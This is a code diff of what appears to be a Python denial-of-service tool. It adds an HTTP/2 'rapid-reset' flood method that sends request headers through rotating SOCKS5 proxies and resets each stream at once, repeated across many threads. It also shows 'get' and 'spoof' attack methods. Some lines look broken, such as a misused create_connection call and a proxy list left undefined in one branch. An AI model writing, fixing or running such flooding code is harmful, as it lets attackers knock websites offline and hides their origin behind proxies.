@@ -339,20 +339,48 @@ def main():
                     except:
                         pass
 
-            def tls():
+            def rapid():
                 while time() < timer:
                     try:
-                        if url.split('://') == 'https':
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s = SSLContext(PROTOCOL_TLSv1_2) 
+                        if url.split('://')[0] == 'https':
+                            sok5 = open('socks5.txt' , 'r').read().split()
+                            s = socksocket()
+                            s = socket.create_connection(target , port)
+                            pri = che(sok5).split(':');
+                            s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
+                            s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
+                            encrypted_data = b64encode("GET {TARGET} HTTP/2".encode()).decode()
+                            conn = H2Connection()
+                            conn.initiate_connection()
                             s = ctx.wrap_socket(s , server_hostname=target)
                             s.connect((target , port))
                         else:
-                            s = socket(AF_INET , SOCK_STREAM)
+                            s = socksocket()
+                            pri = che(sok5).split(':');
+                            s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
+                            s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
+                            encrypted_data = b64encode("GET {TARGET} HTTP/2".encode()).decode()
+                            conn = H2Connection()
+                            conn.initiate_connection()
                             s.connect((target , port))
                         for _ in range(rpc):
-                            payl = f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode()
-                            s.send(payl)
+                            iur = "https" if url.split('://')[0] == "https" else "http"
+                            payl = {
+                                ":method": "GET",
+                                ":path": path,
+                                ":scheme": iur,
+                                ":authority": target,
+                                "User-Agent": ua,
+                                "Accept": che(app),
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "encrypted-data": encrypted_data
+                            }
+                            stream_id = conn.get_next_available_stream_id()
+                            conn.send_headers(stream_id , payl)
+                            s.send(conn.data_to_send())
+                            conn.reset_stream(stream_id)
+                            s.send(conn.data_to_send())
+                            s.close()
                     except:
                         pass 
 
@@ -568,7 +596,6 @@ def main():
                             conn.initiate_connection()
                             s = ctx.wrap_socket(s , server_hostname=target)
                             s.connect((target , port))
-                            iur = "https"
                         else:
                             s = socksocket()
                             pri = che(sok5).split(':');
@@ -578,15 +605,16 @@ def main():
                             conn = H2Connection()
                             conn.initiate_connection()
                             s.connect((target , port))
-                            iur = "http"
                         for _ in range(rpc):
+                            iur = "https" if url.split('://')[0] == "https" else "http"
                             payl = {
                                 ":method": "GET",
                                 ":path": path,
                                 ":scheme": iur,
                                 ":authority": target,
                                 "User-Agent": ua,
-                                "Accept-Encoding": "gzip, deflate",
+                                "Accept": che(app),
+                                "Accept-Encoding": "gzip, deflate, br",
                                 "encrypted-data": encrypted_data
                             }
                             stream_id = conn.get_next_available_stream_id()
@@ -917,9 +945,9 @@ def main():
             elif method == 'get':
                 for _ in range(threads):
                     thr(target=get).start()
-            elif method == 'tls':
+            elif method == 'rapid-reset':
                 for _ in range(threads):
-                    thr(target=tls).start()
+                    thr(target=rapid).start()
             elif method == 'spoof':
                 for _ in range(threads):
                     thr(target=spoof).start()
